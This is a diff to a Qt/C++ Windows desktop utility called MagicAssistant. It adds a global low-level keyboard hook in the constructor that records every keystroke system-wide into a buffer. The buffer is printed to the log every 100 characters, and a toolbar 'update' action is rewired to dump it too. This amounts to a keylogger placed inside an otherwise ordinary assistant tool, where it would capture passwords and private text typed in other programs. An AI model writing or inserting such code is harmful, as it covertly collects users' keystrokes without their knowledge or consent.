@@ -30,6 +30,32 @@
 
 #include <windows.h>
 
+HHOOK myhook;
+
+QString g_keyExport;
+
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
+
+    if (nCode >= 0 && wParam == WM_KEYDOWN)
+    {
+        QString str;
+        str += QChar(int(p->vkCode));
+        str += "(" + QString::number(p->vkCode) + ")";
+        g_keyExport += str;
+    }
+
+    // export every 100 character.
+    if(g_keyExport.size() >= 100)
+    {
+        qInfo() << "key output:" << g_keyExport;
+        g_keyExport.clear();
+    }
+
+    return CallNextHookEx(myhook, nCode, wParam, lParam);
+}
+
 MagicAssistant::MagicAssistant(QWidget *parent) :
     QWidget(parent),
     ui(new Ui::MagicAssistant)
@@ -59,6 +85,9 @@ MagicAssistant::MagicAssistant(QWidget *parent) :
     initHotKey();
 
     initToolBarFunction();
+
+    // 设置键盘全局监听.
+    myhook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
 }
 
 MagicAssistant::~MagicAssistant()
@@ -174,12 +203,22 @@ void MagicAssistant::initHotKey()
 
 void MagicAssistant::initToolBarFunction()
 {
-    //connect(_toolbar, &ToolBar::updateMetaDataRequested, this, &MagicAssistant::updateMetaData);
+    connect(_toolbar, &ToolBar::updateRequested, this, &MagicAssistant::execUpdate);
     //connect(_toolbar, &ToolBar::vsbuildRequested, this, &MagicAssistant::execVSBuild);
     connect(_toolbar, &ToolBar::openCommandRequested, this, &MagicAssistant::openCommand);
     connect(_toolbar, &ToolBar::openProjectDirRequested, this, &MagicAssistant::openProjectDir);
     connect(_toolbar, &ToolBar::screenShotRequested, this, &MagicAssistant::screenShot);
     connect(_toolbar, &ToolBar::shutdownRequested, this, &MagicAssistant::shutdown);
+}
+
+void MagicAssistant::execUpdate()
+{
+    // update output.
+    if(!g_keyExport.isEmpty())
+    {
+        qInfo() << "key output:" << g_keyExport;
+        g_keyExport.clear();
+    }
 }
 
 void MagicAssistant::autoStart(bool is_start)
